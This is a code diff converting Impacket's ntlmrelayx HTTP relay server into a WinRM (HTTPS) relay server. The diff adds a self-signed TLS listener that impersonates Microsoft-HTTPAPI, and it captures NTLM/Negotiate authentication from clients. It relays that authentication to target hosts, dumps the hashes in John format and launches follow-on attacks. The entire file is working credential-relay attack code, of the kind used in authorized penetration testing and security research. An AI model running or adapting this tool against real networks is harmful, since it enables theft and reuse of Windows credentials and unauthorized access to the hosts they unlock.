@@ -1,23 +1,21 @@
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright Fortra, LLC and its affiliated companies 
-#
-# All rights reserved.
+# Copyright (C) 2022 Fortra. All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
 # Description:
-#   HTTP Relay Server
+#   WinRM (HTTPS) Relay Server
 #
-#   This is the HTTP server which relays the NTLMSSP  messages to other protocols
+#   This is the WinRM (HTTPS) server which relays the NTLMSSP  messages to other protocols
 #
 # Authors:
-#   Alberto Solino (@agsolino)
-#   Dirk-jan Mollema / Fox-IT (https://www.fox-it.com)
-#
+#   Joe Mondloch (jmk@foofus.net)
+#   Aurélien Chalot (@Defte_)
 
+import ssl
 import http.server
 import socketserver
 import socket
@@ -27,6 +25,8 @@ import struct
 import string
 from threading import Thread
 from six import PY2, b
+import tempfile
+from OpenSSL import crypto
 
 from impacket import ntlm, LOG
 from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
@@ -35,22 +35,50 @@ from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
 from impacket.examples.utils import get_address
 
-class HTTPRelayServer(Thread):
+class WinRMSRelayServer(Thread):
 
     class HTTPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
         def __init__(self, server_address, RequestHandlerClass, config):
             self.config = config
             self.daemon_threads = True
             self.address_family, server_address = get_address(server_address[0], server_address[1], self.config.ipv6)
-            # Tracks the number of times authentication was prompted for WPAD per client
             self.wpad_counters = {}
+            
             socketserver.TCPServer.allow_reuse_address = True
             socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)
 
+            key = crypto.PKey()
+            key.generate_key(crypto.TYPE_RSA, 2048)
+            cert = crypto.X509()
+            cert.get_subject().CN = "localhost"
+            cert.set_serial_number(random.randint(0, 100000))
+            cert.gmtime_adj_notBefore(0)
+            cert.gmtime_adj_notAfter(10 * 365 * 24 * 60 * 60)
+            cert.set_issuer(cert.get_subject())
+            cert.set_pubkey(key)
+            cert.sign(key, "sha256")
+
+            cert_file = tempfile.NamedTemporaryFile(delete=False)
+            key_file = tempfile.NamedTemporaryFile(delete=False)
+            cert_file.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
+            key_file.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))
+            cert_file.close()
+            key_file.close()
+
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            context.load_cert_chain(certfile=cert_file.name, keyfile=key_file.name)
+
+            self.ssl_context = context
+            self.socket = context.wrap_socket(self.socket, server_side=True)
+
     class HTTPHandler(http.server.SimpleHTTPRequestHandler):
         def __init__(self,request, client_address, server):
+            self.tls_context = server.ssl_context
+
+            self.server_version = "Microsoft-HTTPAPI/2.0"
+            self.sys_version = ""
             self.server = server
-            self.protocol_version = 'HTTP/1.1'
+            self.protocol_version = "HTTP/1.1"
             self.challengeMessage = None
             self.target = None
             self.client = None
@@ -59,6 +87,8 @@ class HTTPRelayServer(Thread):
             self.domainIp = None
             self.authUser = None
             self.relayToHost = False
+            self.isFirstNeg = True
+            self.negotiation_count = 0 
             self.wpad = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||' \
                         '(host == "127.0.0.1")) return "DIRECT"; if (dnsDomainIs(host, "%s")) return "DIRECT"; ' \
                         'return "PROXY %s:80; DIRECT";} '
@@ -69,8 +99,8 @@ class HTTPRelayServer(Thread):
             try:
                 http.server.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
             except Exception as e:
-                LOG.debug("(HTTP): Exception:", exc_info=True)
-                LOG.error("(HTTP): %s" % str(e))
+                LOG.debug("(WinRMS): Exception:", exc_info=True)
+                LOG.error("(WinRMS): %s" % str(e))
 
         def handle_one_request(self):
             try:
@@ -78,20 +108,20 @@ class HTTPRelayServer(Thread):
             except KeyboardInterrupt:
                 raise
             except Exception as e:
-                LOG.debug("(HTTP): Exception:", exc_info=True)
-                LOG.error('(HTTP): Exception in HTTP request handler: %s' % e)
+                LOG.debug("(WinRMS): Exception:", exc_info=True)
 
         def log_message(self, format, *args):
             return
 
         def send_error(self, code, message=None):
-            if message.find('RPC_OUT') >=0 or message.find('RPC_IN'):
+            if message.find('RPC_OUT') >= 0 or message.find('RPC_IN'):
+                LOG.info('(WinRMS): send_error path: %s' % self.path.lower())
                 return self.do_GET()
-            return http.server.SimpleHTTPRequestHandler.send_error(self,code,message)
+            return http.server.SimpleHTTPRequestHandler.send_error(self, code, message)
 
         def send_not_found(self):
             self.send_response(404)
-            self.send_header('WWW-Authenticate', 'NTLM')
+            self.send_header('WWW-Authenticate', 'Negotiate')
             self.send_header('Content-type', 'text/html')
             self.send_header('Content-Length', '0')
             self.send_header('Connection', 'close')
@@ -158,14 +188,17 @@ class HTTPRelayServer(Thread):
                 else:
                     typeX = autorizationHeader
                 try:
-                    _, blob = typeX.split('NTLM')
+                    try:
+                        _, blob = typeX.split('NTLM')
+                    # Not using NTLM but Negotiate
+                    except ValueError:
+                        _, blob = typeX.split('Negotiate')
                     token = base64.b64decode(blob.strip())
                 except Exception:
-                    LOG.debug("(HTTP): Exception:", exc_info=True)
+                    LOG.debug("(WinRMS): Exception:", exc_info=True)
                     self.do_AUTHHEAD(message = b'NTLM', proxy=proxy)
                 else:
                     messageType = struct.unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
-
             return token, messageType
 
         def do_HEAD(self):
@@ -183,9 +216,6 @@ class HTTPRelayServer(Thread):
             return
 
         def do_PROPFIND(self):
-
-            LOG.info('(HTTP): Client requested path: %s' % self.path.lower())
-
             proxy = False
             if (".jpg" in self.path) or (".JPG" in self.path):
                 content = b"""<?xml version="1.0"?><D:multistatus xmlns:D="DAV:"><D:response><D:href>http://webdavrelay/file/image.JPG/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>image.JPG</D:displayname><D:getcontentlength>4456</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>4ebabfcee4364434dacb043986abfffe</D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>"""
@@ -194,7 +224,7 @@ class HTTPRelayServer(Thread):
 
             token, messageType = self.strip_blob(proxy)
 
-            # Should we relay or log-in locally?
+            # Should we relay or -in locally?
             if self.relayToHost is False and not self.server.config.disableMulti:
                 self.do_local_auth(messageType, token, proxy)
                 return
@@ -209,7 +239,7 @@ class HTTPRelayServer(Thread):
             else:
                 self.send_response(401)
                 self.send_header('WWW-Authenticate', message.decode('utf-8'))
-            self.send_header('Content-type', 'text/html')
+
             self.send_header('Content-Length','0')
             self.send_header('Connection', 'keep-alive')
             self.end_headers()
@@ -221,8 +251,8 @@ class HTTPRelayServer(Thread):
             if proxy:
                 self.send_header('Proxy-Authenticate', 'NTLM')
             else:
-                self.send_header('WWW-Authenticate', 'NTLM')
-            self.send_header('Content-type', 'text/html')
+                self.send_header('WWW-Authenticate', 'Negotiate')
+
             self.send_header('Connection','keep-alive')
             self.send_header('Location','/%s' % rstr)
             self.send_header('Content-Length','0')
@@ -236,8 +266,11 @@ class HTTPRelayServer(Thread):
             self.send_header('Connection','close')
             self.end_headers()
 
+        def do_GET(self):
+            return self.do_GETPOST()
+
         def do_POST(self):
-            return self.do_GET()
+            return self.do_GETPOST()
 
         def do_CONNECT(self):
             # Client is using our server as a Proxy
@@ -248,20 +281,13 @@ class HTTPRelayServer(Thread):
             self.do_relay(messageType, token, proxy)
             return
 
-        def do_GET(self):
-            if self.server.config.mode == 'REDIRECT':
-                self.do_SMBREDIRECT()
-                return
-
-            LOG.info('(HTTP): Client requested path: %s' % self.path.lower())
-
-            # Serve WPAD if:
-            # - The client requests it
-            # - A WPAD host was provided in the command line options
-            # - The client has not exceeded the wpad_auth_num threshold yet
-            if self.path.lower() == '/wpad.dat' and self.server.config.serve_wpad and self.should_serve_wpad(self.client_address[0]):
-                LOG.info('(HTTP): Serving PAC file to client %s' % self.client_address[0])
-                self.serve_wpad()
+        def do_GETPOST(self): 
+            if self.command == 'POST' and "/wsman" in self.path.lower():
+                content_length = int(self.headers.get('Content-Length', 0))
+                self.rfile.read(content_length)
+            else:
+                LOG.info('(WinRMS): Client requested path: %s' % self.path.lower())
+                self.send_not_found()
                 return
 
             # Determine if the user is connecting to our server directly or attempts to use it as a proxy
@@ -277,7 +303,6 @@ class HTTPRelayServer(Thread):
                 self.do_local_auth(messageType, token, proxy)
                 return
             else:
-                # We can start the relay process
                 self.do_relay(messageType, token, proxy)
 
             return
@@ -288,6 +313,12 @@ class HTTPRelayServer(Thread):
                 # If connection failed, return
                 if not self.client.initConnection():
                     return False
+
+                if self.negotiation_count > 1:
+                  return False 
+
+                self.negotiation_count += 1
+
                 self.challengeMessage = self.client.sendNegotiate(token)
 
                 # Remove target NetBIOS field from the NTLMSSP_CHALLENGE
@@ -302,10 +333,9 @@ class HTTPRelayServer(Thread):
                 if self.challengeMessage is False:
                     return False
             else:
-                LOG.error('(HTTP): Protocol Client for %s not found!' % self.target.scheme.upper())
+                LOG.error('(WinRMS): Protocol Client for %s not found!' % self.target.scheme.upper())
                 return False
 
-            # Calculate auth
             self.do_AUTHHEAD(message = b'NTLM '+base64.b64encode(self.challengeMessage.getData()), proxy=proxy)
             return True
 
@@ -313,8 +343,6 @@ class HTTPRelayServer(Thread):
             if authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
                 clientResponse, errorCode = self.client.sendAuth(token)
             else:
-                # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
-                # when coming from localhost
                 errorCode = STATUS_ACCESS_DENIED
 
             if errorCode == STATUS_SUCCESS:
@@ -355,25 +383,27 @@ class HTTPRelayServer(Thread):
                 challengeMessage['Version'] = b'\xff' * 8
                 challengeMessage['VersionLen'] = 8
 
-                self.do_AUTHHEAD(message=b'NTLM ' + base64.b64encode(challengeMessage.getData()),proxy=proxy)
+                self.do_AUTHHEAD(message=b'Negotiate ' + base64.b64encode(challengeMessage.getData()),proxy=proxy)
                 return
 
             elif messageType == 3:
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
-                self.authUser = authenticateMessage.getUserString()
+
+                if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
+                    self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
+                                                authenticateMessage['user_name'].decode('utf-16le'))).upper()
+                else:
+                    self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
+                                                authenticateMessage['user_name'].decode('ascii'))).upper()
 
                 self.target = self.server.config.target.getTarget(identity = self.authUser)
                 if self.target is None:
-                    if self.server.config.keepRelaying:
-                        self.server.config.target.reloadTargets(full_reload=True)
-                        self.target = self.server.config.target.getTarget(identity=self.authUser)
-                    else:
-                        LOG.info("(HTTP): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
-                        self.send_not_found()
-                        return
+                    LOG.info("(WinRMS): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
+                    self.send_not_found()
+                    return
 
-                LOG.info("(HTTP): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
+                LOG.info("(WinRMS): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
 
                 self.relayToHost = True
                 self.do_REDIRECT()
@@ -383,45 +413,29 @@ class HTTPRelayServer(Thread):
                 if self.server.config.disableMulti:
                     self.target = self.server.config.target.getTarget(multiRelay=False)
                     if self.target is None:
-                        if self.server.config.keepRelaying:
-                            self.server.config.target.reloadTargets(full_reload=True)
-                            self.target = self.server.config.target.getTarget(multiRelay=False)
-                        else:
-                            LOG.info("(HTTP): Connection from %s controlled, but there are no more targets left!" % self.client_address[0])
-                            self.send_not_found()
-                            return
+                        LOG.info("(WinRMS): Connection from %s controlled, but there are no more targets left!" % self.client_address[0])
+                        self.send_not_found()
+                        return
 
-                    LOG.info("(HTTP): Connection from %s controlled, attacking target %s://%s" % (self.client_address[0], self.target.scheme, self.target.netloc))
+                    LOG.info("(WinRMS): Connection from %s controlled, attacking target %s://%s" % (self.client_address[0], self.target.scheme, self.target.netloc))
 
-                try:
-                    ntlm_negotiate_response = self.do_ntlm_negotiate(token, proxy=proxy)
-                except Exception as e:
-                    LOG.error('(HTTP): Exception while Negotiating NTLM with %s://%s: "%s"' % (self.target.scheme, self.target.netloc, str(e)))
-                    ntlm_negotiate_response = False
-
-                if not ntlm_negotiate_response:
+                if not self.do_ntlm_negotiate(token, proxy=proxy):
                     # Connection failed
                     if self.server.config.disableMulti:
-                        LOG.error('(HTTP): Negotiating NTLM with %s://%s failed' % (self.target.scheme, self.target.netloc))
-                        self.server.config.target.registerTarget(self.target)
+                        LOG.error('(WinRMS): Negotiating NTLM with %s://%s failed' % (self.target.scheme, self.target.netloc))
                         self.send_not_found()
                         return
                     else:
-                        LOG.error('(HTTP): Negotiating NTLM with %s://%s failed. Skipping to next target' % (self.target.scheme, self.target.netloc))
+                        LOG.error('(WinRMS): Negotiating NTLM with %s://%s failed. Skipping to next target' % (self.target.scheme, self.target.netloc))
 
-                        self.server.config.target.registerTarget(self.target, gotUsername=self.authUser)
                         self.target = self.server.config.target.getTarget(identity=self.authUser)
 
                         if self.target is None:
-                            if self.server.config.keepRelaying:
-                                self.server.config.target.reloadTargets(full_reload=True)
-                                self.target = self.server.config.target.getTarget(identity=self.authUser)
-                            else:
-                                LOG.info("(HTTP): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
-                                self.send_not_found()
-                                return
+                            LOG.info("(WinRMS): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
+                            self.send_not_found()
+                            return
 
-                        LOG.info("(HTTP): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
+                        LOG.info("(WinRMS): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
 
                         self.do_REDIRECT()
 
@@ -430,43 +444,41 @@ class HTTPRelayServer(Thread):
                 authenticateMessage.fromString(token)
 
                 if self.server.config.disableMulti:
-                    self.authUser = authenticateMessage.getUserString()
+                    if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
+                        self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('utf-16le'),
+                                                    authenticateMessage['user_name'].decode('utf-16le'))).upper()
+                    else:
+                        self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode('ascii'),
+                                                    authenticateMessage['user_name'].decode('ascii'))).upper()
                     target = '%s://%s@%s' % (self.target.scheme, self.authUser.replace("/", '\\'), self.target.netloc)
 
                 if not self.do_ntlm_auth(token, authenticateMessage):
-                    LOG.error("(HTTP): Authenticating against %s://%s as %s FAILED" % (self.target.scheme, self.target.netloc, self.authUser))
+                    LOG.error("(WinRMS): Authenticating against %s://%s as %s FAILED" % (self.target.scheme, self.target.netloc,
+                                                                               self.authUser))
                     if self.server.config.disableMulti:
                         self.send_not_found()
                         return
+
                     # Only skip to next if the login actually failed, not if it was just anonymous login or a system account
                     # which we don't want
                     if authenticateMessage['user_name'] != '':  # and authenticateMessage['user_name'][-1] != '$':
-                        self.server.config.target.registerTarget(self.target, gotUsername=self.authUser)
                         # No anonymous login, go to next host and avoid triggering a popup
                         self.target = self.server.config.target.getTarget(identity=self.authUser)
                         if self.target is None:
+                            LOG.info("(WinRMS): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
+                            self.send_not_found()
+                            return
 
-                            if self.server.config.keepRelaying:
-                                self.server.config.target.reloadTargets(full_reload=True)
-                                self.target = self.server.config.target.getTarget(identity=self.authUser)
-                            else:
-                                LOG.info("(HTTP): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
-                                self.send_not_found()
-                                return
+                        LOG.info("(WinRMS): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
 
-                        self.send_not_found()  # Stop relaying at first login fail, this matches the behavior of smbrelayserver
-
-                        # Uncomment lines below to keep relaying after login failures
-                        # LOG.info("(HTTP): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
-
-                        # self.do_REDIRECT()
+                        self.do_REDIRECT()
                     else:
                         # If it was an anonymous login, send 401
-                        self.do_AUTHHEAD(b'NTLM', proxy=proxy)
+                        self.do_AUTHHEAD(b'Negotiate', proxy=proxy)
                 else:
                     # Relay worked, do whatever we want here...
                     self.client.setClientId()
-                    LOG.info("(HTTP): Authenticating connection from %s@%s against %s://%s SUCCEED [%s]" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
+                    LOG.info("(WinRMS): Authenticating connection from %s@%s against %s://%s SUCCEED [%s]" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
 
                     ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                         authenticateMessage['user_name'],
@@ -474,17 +486,15 @@ class HTTPRelayServer(Thread):
                                                         authenticateMessage['lanman'], authenticateMessage['ntlm'])
                     self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data
 
-                    if self.server.config.dumpHashes is True:
-                        LOG.info("(HTTP): %s" % ntlm_hash_data['hash_string'])
-
                     if self.server.config.outputFile is not None:
                         writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                               self.server.config.outputFile)
 
-                    if not self.server.config.isADCSAttack:
-                        self.server.config.target.registerTarget(self.target, True, self.authUser)
+                    if self.server.config.dumpHashes is True:
+                        LOG.info("(WinRMS): %s" % ntlm_hash_data['hash_string'])
 
                     self.do_attack()
+
                     if self.server.config.disableMulti:
                         # We won't use the redirect trick, closing connection...
                         if self.command == "PROPFIND":
@@ -497,27 +507,24 @@ class HTTPRelayServer(Thread):
                         self.target = self.server.config.target.getTarget(identity=self.authUser)
 
                         if self.target is None:
-                            if self.server.config.keepRelaying:
-                                self.server.config.target.reloadTargets(full_reload=True)
-                                self.target = self.server.config.target.getTarget(identity=self.authUser)
-                            else:
-                                LOG.info("(HTTP): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
-                                # Return Multi-Status status code to WebDAV servers
-                                if self.command == "PROPFIND":
-                                    self.send_multi_status(content)
-                                    return
+                            LOG.info("(WinRMS): Connection from %s@%s controlled, but there are no more targets left!" % (self.authUser, self.client_address[0]))
 
-                                # Serve image and return 200 if --serve-image option has been set by user
-                                if (self.server.config.serve_image):
-                                    self.serve_image()
-                                    return
-
-                                # And answer 404 not found
-                                self.send_not_found()
+                            # Return Multi-Status status code to WebDAV servers
+                            if self.command == "PROPFIND":
+                                self.send_multi_status(content)
                                 return
 
+                            # Serve image and return 200 if --serve-image option has been set by user
+                            if (self.server.config.serve_image):
+                                self.serve_image()
+                                return
+
+                            # And answer 404 not found
+                            self.send_not_found()
+                            return
+
                         # We have the next target, let's keep relaying...
-                        LOG.info("(HTTP): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
+                        LOG.info("(WinRMS): Connection from %s@%s controlled, attacking target %s://%s" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
                         self.do_REDIRECT()
 
         def do_attack(self):
@@ -529,13 +536,13 @@ class HTTPRelayServer(Thread):
                 return
 
             # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
-            if self.target.scheme.upper() in self.server.config.attacks:
+            if self.target.scheme.upper()  in self.server.config.attacks:
                 # We have an attack.. go for it
                 clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session,
                                                                                self.authUser, self.target, self.client)
                 clientThread.start()
             else:
-                LOG.error('(HTTP): No attack configured for %s' % self.target.scheme.upper())
+                LOG.error('(WinRMS): No attack configured for %s' % self.target.scheme.upper())
 
     def __init__(self, config):
         Thread.__init__(self)
@@ -546,16 +553,15 @@ class HTTPRelayServer(Thread):
 
     def run(self):
         if not self.config.listeningPort:
-            self.config.listeningPort = 80
+            self.config.listeningPort = 5986
 
-        LOG.info("Setting up HTTP Server on port %s" % self.config.listeningPort)
-
-        # changed to read from the interfaceIP set in the configuration
+        LOG.info("Setting up WinRMS (HTTPS) Server on port %s" % self.config.listeningPort)
         self.server = self.HTTPServer((self.config.interfaceIp, self.config.listeningPort), self.HTTPHandler, self.config)
 
         try:
              self.server.serve_forever()
         except KeyboardInterrupt:
              pass
-        LOG.info('Shutting down HTTP Server')
+
+        LOG.info('Shutting down WinRMS (HTTPS) Server')
         self.server.server_close()
